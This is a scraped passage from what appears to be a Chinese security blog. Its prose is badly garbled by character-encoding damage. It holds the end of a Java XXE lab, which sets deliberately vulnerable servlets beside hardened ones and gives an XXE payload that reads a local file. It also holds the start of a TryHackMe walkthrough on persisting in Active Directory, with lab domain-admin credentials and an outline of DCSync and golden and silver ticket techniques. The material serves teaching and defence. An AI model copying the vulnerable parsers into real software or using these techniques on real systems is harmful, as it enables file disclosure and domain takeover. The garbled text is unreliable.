DocumentBuilderFactory.newInstance(); DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder(); BufferedReader br = new BufferedReader(req.getReader()); Document document = documentBuilder.parse(new InputSource(br)); // è·å–å“åº”è¾“å‡ºæµ PrintWriter writer = resp.getWriter(); String textContent = document.getDocumentElement().getTextContent(); writer.print(textContent); } catch (Exception e) { e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp) { try { DocumentBuilderFactory documentBuilderFactory = DocumentBuilderFactory.newInstance(); documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); documentBuilderFactory.setAttribute(XMLConstants.FEATURE_SECURE_PROCESSING, true); documentBuilderFactory.setExpandEntityReferences(false); DocumentBuilder documentBuilder = documentBuilderFactory.newDocumentBuilder(); BufferedReader br = new BufferedReader(req.getReader()); Document document = documentBuilder.parse(new InputSource(br)); // è·å–å“åº”è¾“å‡ºæµ PrintWriter writer = resp.getWriter(); String textContent = document.getDocumentElement().getTextContent(); writer.print(textContent); } catch (Exception e) { e.printStackTrace(); } } } ä¸ä¸Šè¿°å®éªŒä¸€ç±»ä¼¼ï¼Œå…³é”®ä»£ç å¦‚ä¸‹ï¼š documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); documentBuilderFactory.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, \"\"); documentBuilderFactory.setAttribute(XMLConstants.FEATURE_SECURE_PROCESSING, true); è¿™é‡Œè®¾ç½®ä¸ºç¦æ­¢è®¿é—®å¤–éƒ¨dtdæ–‡ä»¶ï¼ˆACCESS_EXTERNAL_DTDä¸ºç©ºï¼‰ã€ç¦æ­¢è®¿é—®å¤–éƒ¨xml schemaæ–‡ä»¶ï¼ˆACCESS_EXTERNAL_SCHEMAä¸ºç©ºï¼‰ å¦å¤–è¿˜æœ‰å¯ç”¨å®‰å…¨å¤„ç†ç‰¹æ€§ï¼ˆFEATURE_SECURE_PROCESSINGï¼‰ï¼šè¿™ä¸ªç‰¹æ€§å°†å¯ç”¨ XML å¤„ç†å™¨çš„å®‰å…¨åŠŸèƒ½ï¼Œä¾‹å¦‚ç¦ç”¨å¤–éƒ¨å®ä½“ï¼ˆExternal Entitiesï¼‰åŠ è½½ï¼Œé˜²æ­¢ XXEï¼ˆXML External Entityï¼‰æ”»å‡»ã€‚ è°ƒç”¨postNoFixXxe è°ƒç”¨postWithFixXxe SAXReaderè§£æxml import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import org.dom4j.Document; import org.dom4j.io.SAXReader; import org.dom4j.io.XMLWriter; public class SAXReaderServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { postNoFixXxe(req,resp); // postWithFixXxe(req,resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp){ try{ SAXReader saxReader = new SAXReader(); Document doc = saxReader.read(req.getReader()); XMLWriter xmlWriter = new XMLWriter(resp.getWriter()); xmlWriter.write(doc); }catch (Exception e){ e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp){ try{ SAXReader saxReader = new SAXReader(); saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); saxReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); Document doc = saxReader.read(req.getReader()); XMLWriter xmlWriter = new XMLWriter(resp.getWriter()); xmlWriter.write(doc); }catch (Exception e){ e.printStackTrace(); } } } ä¸å®éªŒä¸€çš„SAXBulideråŸºæœ¬ç›¸åŒï¼š saxReader.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\", true); saxReader.setFeature(\"http://xml.org/sax/features/external-general-entities\", false); saxReader.setFeature(\"http://xml.org/sax/features/external-parameter-entities\", false); saxReader.setFeature(\"http://apache.org/xml/features/nonvalidating/load-external-dtd\", false); ä¸å†èµ˜è¿°ï¼Œè°ƒç”¨postNoFixXxe è°ƒç”¨postWithFixXxe SAXTransformerFactoryè§£æxml SAXTransformerFactoryè§£æxmlï¼Œéœ€è¦xsltï¼Œå¦åˆ™ä¼šæŠ¥é”™ï¼Œæ‰€ä»¥æ„é€ æ—¶è¦æ„é€ xsltã€‚æ­£å¸¸æƒ…å†µéœ€è¦å°†xmlè¾“å‡ºï¼Œæœ¬æ¬¡å®éªŒä¸ºäº†èŠ‚çœæ—¶é—´æ²¡æœ‰è¾“å‡ºã€‚ import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.XMLConstants; import javax.xml.transform.Result; import javax.xml.transform.sax.SAXTransformerFactory; import javax.xml.transform.sax.TransformerHandler; import javax.xml.transform.stream.StreamResult; import javax.xml.transform.stream.StreamSource; import java.io.IOException; public class SAXTransformerFactoryServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { postNoFixXxe(req, resp); // postWithFixXxe(req, resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp){ try{ SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance(); StreamSource source = new StreamSource(req.getReader()); TransformerHandler transformerHandler = sf.newTransformerHandler(source); // åˆ›å»ºResultå¯¹è±¡ï¼Œå¹¶é€šè¿‡transformerHandlerå°†ç›®çš„æµä¸å…¶å…³è” Result result = new StreamResult(resp.getWriter()); transformerHandler.setResult(result); }catch (Exception e){ e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp){ try{ SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance(); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); StreamSource source = new StreamSource(req.getReader()); TransformerHandler transformerHandler = sf.newTransformerHandler(source); // åˆ›å»ºResultå¯¹è±¡ï¼Œå¹¶é€šè¿‡transformerHandlerå°†ç›®çš„æµä¸å…¶å…³è” Result result = new StreamResult(resp.getWriter()); transformerHandler.setResult(result); }catch (Exception e){ e.printStackTrace(); } } } å…³é”®ä»£ç ï¼š sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); ä¸€ä¸ªæ˜¯ç¦æ­¢è®¿é—®å¤–éƒ¨dtdæ–‡ä»¶ï¼› å¦ä¸€ä¸ªæ˜¯ç¦æ­¢è®¿é—®å¤–éƒ¨æ ·å¼è¡¨æ–‡ä»¶ï¼šæ ·å¼è¡¨ç”¨äºæŒ‡å®š XML æ•°æ®çš„å‘ˆç°æ–¹å¼ï¼Œç¦æ­¢è®¿é—®å¤–éƒ¨æ ·å¼è¡¨å¯ä»¥é˜²æ­¢ XML è½¬æ¢å™¨åŠ è½½æ¶æ„å†…å®¹ï¼Œæé«˜å®‰å…¨æ€§ã€‚ æ„é€ xmlå’Œxsltå¦‚ä¸‹ï¼š &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;!DOCTYPE xxe [ &lt;!ENTITY file SYSTEM \"file:///E://111.txt\" &gt; ]&gt; &lt;?xml-stylesheet type=\"text/xsl\" href=\"E://222.xsl\"?&gt; &lt;catalog&gt; &lt;test&gt;&amp;file;&lt;/test&gt; &lt;/catalog&gt; &lt;!--xsltæ–‡ä»¶å†…å®¹å¦‚ä¸‹--&gt; &lt;xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\"&gt; &lt;xsl:template match=\"/\"&gt; &lt;html&gt; &lt;body&gt; &lt;h2&gt;teat&lt;/h2&gt; &lt;table border=\"1\"&gt; &lt;tr bgcolor=\"#9acd32\"&gt; &lt;th align=\"left\"&gt;File&lt;/th&gt; &lt;/tr&gt; &lt;xsl:for-each select=\"catalog\"&gt; &lt;tr&gt; &lt;td&gt;&lt;xsl:value-of select=\"test\"/&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/xsl:for-each&gt; &lt;/table&gt; &lt;/body&gt; &lt;/html&gt; &lt;/xsl:template&gt; &lt;/xsl:stylesheet&gt; æ„é€ xmlè¯·æ±‚ï¼Œåœ¨æœªç¦æ­¢å¤–éƒ¨å®ä½“æƒ…å†µä¸‹å¯ä»¥æ­£å¸¸å“åº”ï¼Œæ§åˆ¶å°æœªæŠ¥é”™ï¼š ä¿®å¤åæŠ¥é”™ï¼š TransformerFactoryè§£æxml è¿™ä¸ªå°±æ˜¯Jenkins Nested Viewæ’ä»¶XXEæ¼æ´(CVE-2021-21680)ç”¨åˆ°çš„xmlè§£æå·¥å…·ã€‚ import javax.servlet.ServletException; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.xml.XMLConstants; import javax.xml.transform.Source; import javax.xml.transform.Transformer; import javax.xml.transform.TransformerException; import javax.xml.transform.TransformerFactory; import javax.xml.transform.stream.StreamResult; import javax.xml.transform.stream.StreamSource; import java.io.IOException; public class TransformerFactoryServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { super.doGet(req, resp); } @Override protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { postNoFixXxe(req, resp); // postWithFixXxe(req, resp); } private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp){ try { TransformerFactory tf = TransformerFactory.newInstance(); StreamSource source = new StreamSource(req.getReader()); tf.newTransformer().transform(source, new StreamResult(resp.getWriter())); } catch (TransformerException | IOException e) { e.printStackTrace(); } } private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp){ try { TransformerFactory tf = TransformerFactory.newInstance(); StreamSource source = new StreamSource(req.getReader()); tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, \"\"); tf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, \"\"); tf.newTransformer().transform(source, new StreamResult(resp.getWriter())); } catch (TransformerException | IOException e) { e.printStackTrace(); } } } ä¸ä¸Šä¸€ä¸ªå®éªŒåŸºæœ¬ç›¸åŒï¼Œä¸å†èµ˜è¿° Unmarshallerè§£æxml ä½¿ç”¨é»˜è®¤çš„è§£ææ–¹æ³•ä¸ä¼šå­˜åœ¨XXEé—®é¢˜ï¼Œè¿™ä¹Ÿæ˜¯å”¯ä¸€ä¸€ä¸ªä½¿ç”¨é»˜è®¤çš„è§£ææ–¹æ³•ä¸ä¼šå­˜åœ¨XXEçš„ä¸€ä¸ªåº“ã€‚ Class tClass = Some.class; JAXBContext context = JAXBContext.newInstance(tClass); Unmarshaller um = context.createUnmarshaller(); Object o = um.unmarshal(ResourceUtils.getPoc1()); tClass.cast(o); å°ç»“ï¼š åŸºæœ¬ä¸Šæ‰€æœ‰çš„ä¿®å¤éƒ½æ˜¯è®¾ç½®ç¦æ­¢å¤–éƒ¨å®ä½“ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„é€šè¿‡setFeatureæˆ–è€…setAttributeæˆ–è€…setPropertyè®¾ç½®å±æ€§æ—¶ï¼Œä¸€å®šè¦æ³¨æ„åœ¨è§£æxmlä¹‹å‰å°±è®¾ç½®ï¼Œå¦åˆ™ä¿®å¤ä¹Ÿæ˜¯æ— æ•ˆçš„ã€‚ Java XXEæ¼æ´çš„ä¿®å¤æˆ–é¢„é˜²ä¸»è¦åœ¨è®¾ç½®ç¦æ­¢dtdï¼Œä¸€èˆ¬å‡ºç°æ¼æ´éœ€è¦æ³¨æ„ï¼š æ˜¯å¦ç¦æ­¢dtdæˆ–è€…entity å‚æ•°æ˜¯å¦å¯æ§ ä¼ å…¥å‚æ•°æ ¼å¼ä¸ºREST XMLæ ¼å¼ï¼ŒX-RequestEntity-ContentType: application/xml 0x04 å‚è€ƒæ–‡ç«  Java XXEæ¼æ´å®éªŒåŠæ€»ç»“","categories":["å¸¸è§topæ¼æ´"]},{"title":"THM-Persisting Active Directory","path":"/2024/02/19/thm-persisting-active-directory/","content":"0x01 ç®€ä»‹ è¯¥ç½‘ç»œæ˜¯ Breaching ADã€Enumerate AD å’Œ Exploiting AD ç½‘ç»œçš„å»¶ç»­ã€‚è¯·ç¡®ä¿å…ˆå®Œæˆè¿™äº›ç½‘ç»œï¼Œç„¶åå†ç»§ç»­æ­¤æ“ä½œã€‚å¦è¯·æ³¨æ„ï¼Œæˆ‘ä»¬å°†å¹¿æ³›è®¨è®º AD å¯¹è±¡ã€‚å¦‚æœæ‚¨éœ€è¦å¤ä¹ ä¸€ä¸‹ï¼Œè¯·å¿«é€Ÿæµè§ˆä¸€ä¸‹è¿™ä¸ªæˆ¿é—´ã€‚ç°åœ¨æˆ‘ä»¬å·²ç»åˆ©ç”¨äº† AD å¹¶å–å¾—äº†ä¸€äº›å¯ä»¥æ‰§è¡Œæˆ‘ä»¬ç›®æ ‡çš„ä½ç½®ï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿æˆ‘ä»¬éƒ¨ç½²æŒä¹…æ€§ä»¥ç¡®ä¿è“é˜Ÿä¸èƒ½ç›´æ¥æŠŠæˆ‘ä»¬è¸¢å‡ºå»ã€‚åœ¨æ­¤ç½‘ç»œä¸­ï¼Œæˆ‘ä»¬å°†æ¢ç´¢å¯ç”¨äºåœ¨ AD ä¸­æŒä¹…åŒ–çš„å‡ ç§ä¸åŒæ–¹æ³•ã€‚ AD ç»´æŒ åœ¨æ”»å‡» AD çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬éœ€è¦ç¡®ä¿éƒ¨ç½²æŒä¹…æ€§ã€‚è¿™å°†ç¡®ä¿è“é˜Ÿæ— æ³•é€šè¿‡ç®€å•åœ°è½®æ¢ä¸€äº›å‡­è¯æ¥å°†æˆ‘ä»¬è¸¢å‡ºå±€ã€‚å¦‚å‰æ‰€è¿°ï¼ŒAD çš„ç ´åè¿‡ç¨‹æ˜¯å¾ªç¯çš„ã€‚å½“æˆ‘ä»¬æŸå®³ AD è´¢äº§æ—¶ï¼Œæˆ‘ä»¬ä¼šéƒ¨ç½²æŒä¹…æ€§ï¼Œè€Œä¸ä»…ä»…æ˜¯åœ¨æœ€åã€‚è¿™ç¡®ä¿äº†å¦‚æœæˆ‘ä»¬çš„ä¸€ä¸ªä½ç½®è¢«è“é˜Ÿçƒ§æ¯ï¼Œæˆ‘ä»¬æœ‰å‡ ä¸ªåå¤‡æ–¹æ¡ˆã€‚åœ¨æ­¤æŒä¹…é˜¶æ®µï¼Œæˆ‘ä»¬å°†ä½¿ç”¨å¤šç§æŠ€æœ¯æ¥ç¡®ä¿æˆ‘ä»¬è·å¾—çš„è®¿é—®æƒé™ä¸ä¼šè¢«ç®€å•åœ°æ’¤é”€ã€‚è¿™äº›æŒä¹…æ€§æŠ€æœ¯å–å†³äºæˆ‘ä»¬è¿„ä»Šä¸ºæ­¢è·å¾—çš„ç‰¹å®šæƒé™å’Œç‰¹æƒã€‚ å­¦ä¹ ç›®æ ‡ åœ¨è¿™ä¸ªç½‘ç»œä¸­ï¼Œæˆ‘ä»¬å°†ä»‹ç»å‡ ç§å¯ç”¨äºåœ¨ AD ä¸­æŒä¹…åŒ–çš„æ–¹æ³•ã€‚è¿™ç»ä¸æ˜¯ä¸€ä¸ªå®Œæ•´çš„åˆ—è¡¨ï¼Œå› ä¸ºå¯ç”¨çš„æ–¹æ³•é€šå¸¸æ˜¯é«˜åº¦æƒ…å¢ƒåŒ–çš„ï¼Œå¹¶ä¸”ä¾èµ–äº AD ç»“æ„å’Œç¯å¢ƒã€‚ä½†æ˜¯ï¼Œæˆ‘ä»¬å°†ä»‹ç»ä»¥ä¸‹æŒä¹… AD æŠ€æœ¯ï¼š AD å‡­æ®å’Œ DCSync-ing é“¶ç¥¨å’Œé‡‘ç¥¨ AD Certificates AD å®‰å…¨æ ‡è¯†ç¬¦ (SID) Access Control Lists è®¿é—®æ§åˆ¶åˆ—è¡¨ ç»„ç­–ç•¥å¯¹è±¡ (GPO) ç´¢å–æ‚¨çš„å‡­è¯ ä¸ºäº†æ¨¡æ‹Ÿ AD è¿è§„ï¼Œæ‚¨å°†è·å¾—ç¬¬ä¸€ç»„ AD å‡­æ®ã€‚ç½‘ç»œè®¾ç½®å®Œæˆåï¼Œåœ¨æ”»å‡»ç®±ä¸Šå¯¼èˆªè‡³ http://distributor.za.tryhackme.loc/creds ä»¥è¯·æ±‚æ‚¨çš„å‡­æ®å¯¹ã€‚å•å‡»â€œè·å–å‡­æ®â€æŒ‰é’®ä»¥æ¥æ”¶å¯ç”¨äºåˆå§‹è®¿é—®çš„å‡­æ®å¯¹ã€‚ æ­¤å‡­æ®å¯¹å°†ä¸ºæ‚¨æä¾›å¯¹ THMWRK1.za.tryhackme.loc çš„ RDP å’Œ SSH è®¿é—®æƒé™ã€‚ THMWRK1 å¯ä»¥è¢«è§†ä¸ºè¿›å…¥è¯¥ç¯å¢ƒçš„è·³è½¬ä¸»æœºï¼Œæ¨¡æ‹Ÿæ‚¨å·²å®ç°çš„ç«‹è¶³ç‚¹ã€‚è·³è½¬ä¸»æœºç»å¸¸æˆä¸ºçº¢é˜Ÿçš„ç›®æ ‡ï¼Œå› ä¸ºå®ƒä»¬æä¾›å¯¹æ–°ç½‘æ®µçš„è®¿é—®ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ Remmina æˆ–ä»»ä½•å…¶ä»–ç±»ä¼¼çš„è¿œç¨‹æ¡Œé¢å®¢æˆ·ç«¯è¿æ¥åˆ°è¯¥ä¸»æœºä»¥è¿›è¡Œ RDPã€‚è¿æ¥æ—¶è®°å¾—æŒ‡å®šza.tryhackme.locçš„åŸŸåã€‚ å¯¹äº SSH è®¿é—®ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹ SSH å‘½ä»¤ï¼š ssh za\\\\colin.lane@thmwrk1.za.tryhackme.loc // Your credentials have been generated: Username: colin.lane Password: Arrangement2012 å‡ºç°æç¤ºæ—¶ï¼Œæä¾›æ‚¨å¸æˆ·çš„å…³è”å¯†ç ã€‚å°½ç®¡ RDP å¯ç”¨äºæ‰€æœ‰ä»»åŠ¡ï¼Œä½† SSH é€Ÿåº¦æ›´å¿«ã€‚ 0x02 é€šè¿‡å‡­è¯è¿›è¡ŒæŒä¹…åŒ– æ­å–œä½  æ­å–œç–²æƒ«çš„æ—…è¡Œè€…ï¼åœ¨çªç ´ ADã€æ‰§è¡Œæšä¸¾å¹¶ä¸€è·¯åˆ©ç”¨å®ƒåˆ°é¡¶éƒ¨ï¼ˆå¦‚æœä½ æŒ‰é¡ºåºå®Œæˆäº†è¿™äº› AD ç½‘ç»œï¼‰ä¹‹åï¼Œä½ ç»ˆäºåˆ°è¾¾äº†æŒä¹…æ€§çš„é…’é¦†ã€‚è‰°è‹¦çš„å·¥ä½œå·²ç»ç»“æŸï¼Œç°åœ¨æ˜¯æ—¶å€™äº«å—ä¸€äº›ä¹è¶£äº†ã€‚è™½ç„¶ AD æŒä¹…æ€§ä»ç„¶æ˜¯ä¸€ä»¶ä¸¥è‚ƒçš„äº‹æƒ…ï¼Œä½†å®ƒç¡®å®ä¸åƒå…¶ä»–é˜¶æ®µé‚£ä¹ˆæœ‰å‹åŠ›ã€‚åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥å°½æƒ…å‘æŒ¥æˆ‘ä»¬çš„åˆ›é€ åŠ›ã€‚æ‰€ä»¥ï¼Œåœ¨æˆ‘ä»¬çš„å°é…’é¦†é‡Œä¼‘æ¯ä¸€ä¸‹æ‚¨ç–²æƒ«çš„éª¨å¤´ï¼Œç»™è‡ªå·±æ³¡ä¸€æ¯å¥½èŒ¶ï¼Œç„¶åæˆ‘ä»¬å°±å¼€å§‹å§ã€‚ è¿åŒæ‚¨çš„ä½ç‰¹æƒå‡­æ®ï¼Œæ‚¨å°†è·å¾—åŸŸç®¡ç†å‘˜å‡­æ®ã€‚å¤šä¹ˆå¹¸è¿å•Šï¼åœ¨è®¨è®ºæŒä¹…æ€§æŠ€æœ¯æ—¶ï¼Œæ‚¨å°†ä½¿ç”¨ç‰¹æƒå‡­æ®å¯¹ä½ç‰¹æƒå‡­æ®é›†æ‰§è¡ŒæŒä¹…æ€§æŠ€æœ¯ã€‚è®°ä¸‹ä»¥ä¸‹ DA å¸æˆ·ï¼š Username: `Administrator` ç”¨æˆ·åï¼š `Administrator` Password: `tryhackmewouldnotguess1@` å¯†ç ï¼š `tryhackmewouldnotguess1@` Domain: `ZA` åŸŸï¼š `ZA` ç”±äºæˆ‘ä»¬ä¸ºæ‚¨æä¾›å¯¹æ•´ä¸ªåŸŸçš„å®Œå…¨è®¿é—®æƒé™ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•çœŸæ­£éšè—ä»»ä½•æ ‡å¿—æˆ–å¼ºè¿«æ‚¨ç¡®ä¿åœ¨å›ç­”é—®é¢˜ä¹‹å‰è‡ªå·±æ‰§è¡Œè¿™äº›æŒä¹…æ€§æŠ€æœ¯ã€‚ä¸è¿‡ï¼Œæˆ‘ä»¬é¼“åŠ±æ‚¨èŠ±æ—¶é—´å°è¯•è¿™äº›æ–¹æ³•ï¼Œå› ä¸ºå½“è“é˜Ÿå¼€å§‹å°†æ‚¨è¸¢å‡ºå±€æ—¶ï¼Œå®ƒä»¬å°†ä½œä¸ºçº¢é˜Ÿè¯„ä¼°çš„å›æŠ¥ã€‚ æˆ‘ä»¬å°†è®¨è®ºçš„ç¬¬ä¸€ä¸ªä¹Ÿæ˜¯æœ€ä¸å¯é çš„æŒä¹…æ€§æŠ€æœ¯æ˜¯å‡­è¯ã€‚å‰é¢è®¨è®ºçš„ä¸€äº›æ¨ªå‘æŠ€æœ¯å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…è·å¾—å‡­è¯çš„è®¿é—®æƒé™ã€‚å½“ä½¿ç”¨â€œå‡­æ®â€ä¸€è¯æ—¶ï¼Œå®ƒå¯èƒ½æ„å‘³ç€ç”¨æˆ·åå’Œå¯†ç å¯¹ï¼Œä½†åœ¨ AD ä¸Šä¸‹æ–‡ä¸­ï¼Œå³ä½¿æ˜¯å¯†ç å“ˆå¸Œä¹Ÿè¶³ä»¥é€šè¿‡å“ˆå¸Œä¼ é€’æŠ€æœ¯è¿›è¡Œèº«ä»½éªŒè¯ã€‚ DC Syncï¼ˆåŒæ­¥ï¼‰ åœ¨å¤§å‹ç»„ç»‡ä¸­ï¼Œæ¯ä¸ªåŸŸåªæœ‰ä¸€ä¸ªåŸŸæ§åˆ¶å™¨æ˜¯ä¸å¤Ÿçš„ã€‚è¿™äº›åŸŸé€šå¸¸åœ¨å¤šä¸ªåŒºåŸŸä½ç½®ä½¿ç”¨ï¼Œå¹¶ä¸”æ‹¥æœ‰å•ä¸ª DC ä¼šæ˜¾ç€å»¶è¿Ÿ AD ä¸­çš„ä»»ä½•èº«ä»½éªŒè¯æœåŠ¡ã€‚å› æ­¤ï¼Œè¿™äº›ç»„ç»‡ä½¿ç”¨å¤šä¸ª DCã€‚é‚£ä¹ˆé—®é¢˜å°±å˜æˆäº†ï¼Œæ‚¨å¦‚ä½•åœ¨ä¸¤ä¸ªä¸åŒçš„åŠå…¬å®¤ä½¿ç”¨ç›¸åŒçš„å‡­æ®è¿›è¡Œèº«ä»½éªŒè¯ï¼Ÿ è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ˜¯åŸŸå¤åˆ¶ã€‚æ¯ä¸ªåŸŸæ§åˆ¶å™¨éƒ½è¿è¡Œä¸€ä¸ªç§°ä¸ºçŸ¥è¯†ä¸€è‡´æ€§æ£€æŸ¥å™¨ (KCC) çš„è¿›ç¨‹ã€‚ KCCä¸ºADæ—ç”Ÿæˆå¤åˆ¶æ‹“æ‰‘ï¼Œå¹¶é€šè¿‡è¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼ˆRPCï¼‰è‡ªåŠ¨è¿æ¥åˆ°å…¶ä»–åŸŸæ§åˆ¶å™¨ä»¥åŒæ­¥ä¿¡æ¯ã€‚è¿™åŒ…æ‹¬æ›´æ–°çš„ä¿¡æ¯ï¼Œä¾‹å¦‚ç”¨æˆ·çš„æ–°å¯†ç å’Œæ–°å¯¹è±¡ï¼Œä¾‹å¦‚åˆ›å»ºæ–°ç”¨æˆ·çš„æ—¶é—´ã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆæ‚¨åœ¨æ›´æ”¹å¯†ç åé€šå¸¸å¿…é¡»ç­‰å¾…å‡ åˆ†é’Ÿæ‰èƒ½è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå› ä¸ºå‘ç”Ÿå¯†ç æ›´æ”¹çš„ DC å¯èƒ½ä¸æ‚¨è¿›è¡Œèº«ä»½éªŒè¯çš„ DC ä¸åŒã€‚ å¤åˆ¶è¿‡ç¨‹ç§°ä¸º DC åŒæ­¥ã€‚ä¸ä»…ä»…æ˜¯ DC å¯ä»¥å¯åŠ¨å¤åˆ¶ã€‚å±äºåŸŸç®¡ç†å‘˜ç»„çš„å¸æˆ·ä¹Ÿå¯ä»¥å‡ºäºåˆæ³•ç›®çš„ï¼ˆä¾‹å¦‚åˆ›å»ºæ–°çš„åŸŸæ§åˆ¶å™¨ï¼‰æ‰§è¡Œæ­¤æ“ä½œã€‚ ä¸€ç§æµè¡Œçš„æ”»å‡»æ˜¯ DC åŒæ­¥æ”»å‡»ã€‚å¦‚æœæˆ‘ä»¬æœ‰æƒè®¿é—®å…·æœ‰åŸŸå¤åˆ¶æƒé™çš„å¸æˆ·ï¼Œæˆ‘ä»¬å¯ä»¥å‘èµ· DC åŒæ­¥æ”»å‡»ä»¥ä» DC è·å–å‡­æ®ã€‚ å¹¶éæ‰€æœ‰å‡­è¯éƒ½æ˜¯ä¸€æ ·çš„ åœ¨å¼€å§‹ DC åŒæ­¥æ”»å‡»ä¹‹å‰ï¼Œæˆ‘ä»¬é¦–å…ˆè®¨è®ºä¸€ä¸‹æˆ‘ä»¬å¯èƒ½ä¼šå¯»æ‰¾å“ªäº›å‡­æ®ã€‚è™½ç„¶æˆ‘ä»¬åº”è¯¥å§‹ç»ˆå¯»æ±‚è½¬å‚¨ç‰¹æƒå‡­æ®ï¼Œä¾‹å¦‚åŸŸç®¡ç†å‘˜ç»„æˆå‘˜çš„å‡­æ®ï¼Œä½†è¿™äº›ä¹Ÿæ˜¯é¦–å…ˆè¦è½®æ¢çš„å‡­æ®ï¼ˆè“é˜Ÿæœ¯è¯­ï¼Œæ„æ€æ˜¯é‡ç½®å¸æˆ·å¯†ç ï¼‰ã€‚å› æ­¤ï¼Œå¦‚æœæˆ‘ä»¬åªæœ‰ç‰¹æƒå‡­è¯ï¼Œå¯ä»¥è‚¯å®šåœ°è¯´ï¼Œä¸€æ—¦è“é˜Ÿå‘ç°æˆ‘ä»¬ï¼Œä»–ä»¬å°±ä¼šè½®æ¢è¿™äº›å¸æˆ·ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå¤±å»è®¿é—®æƒé™ã€‚ é‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å°±æ˜¯åšæŒæ‹¥æœ‰æ¥è¿‘ç‰¹æƒçš„å‡­è¯ã€‚æˆ‘ä»¬å¹¶ä¸æ€»æ˜¯éœ€è¦ç‹å›½çš„å®Œæ•´é’¥åŒ™ï¼›æˆ‘ä»¬åªéœ€è¦è¶³å¤Ÿçš„é’¥åŒ™æ¥ç¡®ä¿æˆ‘ä»¬ä»ç„¶èƒ½å¤Ÿå®ç°ç›®æ ‡æ‰§è¡Œå¹¶å§‹ç»ˆè®©è“é˜Ÿä¿æŒè­¦æƒ•ã€‚å› æ­¤ï¼Œæˆ‘ä»¬åº”è¯¥å°è¯•é€šè¿‡å¦‚ä¸‹å‡­è¯æ¥æŒä¹…ä¿å­˜ï¼š åœ¨å¤šå°è®¡ç®—æœºä¸Šå…·æœ‰æœ¬åœ°ç®¡ç†å‘˜æƒé™çš„å‡­æ®ã€‚é€šå¸¸ï¼Œç»„ç»‡æœ‰ä¸€ä¸¤ä¸ªå¯¹å‡ ä¹æ‰€æœ‰è®¡ç®—æœºå…·æœ‰æœ¬åœ°ç®¡ç†æƒé™çš„ç»„ã€‚è¿™äº›ç»„é€šå¸¸åˆ†ä¸ºä¸€ç»„ç”¨äºå·¥ä½œç«™ï¼Œä¸€ç»„ç”¨äºæœåŠ¡å™¨ã€‚é€šè¿‡è·å–è¿™äº›å›¢ä½“æˆå‘˜çš„å‡­æ®ï¼Œæˆ‘ä»¬ä»ç„¶å¯ä»¥è®¿é—®è¯¥åº„å›­ä¸­çš„å¤§éƒ¨å…·æœ‰å§”æ´¾æƒé™çš„æœåŠ¡å¸æˆ·ã€‚æœ‰äº†è¿™äº›è´¦æˆ·ï¼Œæˆ‘ä»¬å°±èƒ½å¤Ÿå¼ºåˆ¶é‡‘ç¥¨å’Œé“¶ç¥¨æ‰§è¡Œ Kerberos å§”æ‰˜æ”»å‡»ã€‚ ç”¨äºç‰¹æƒ AD 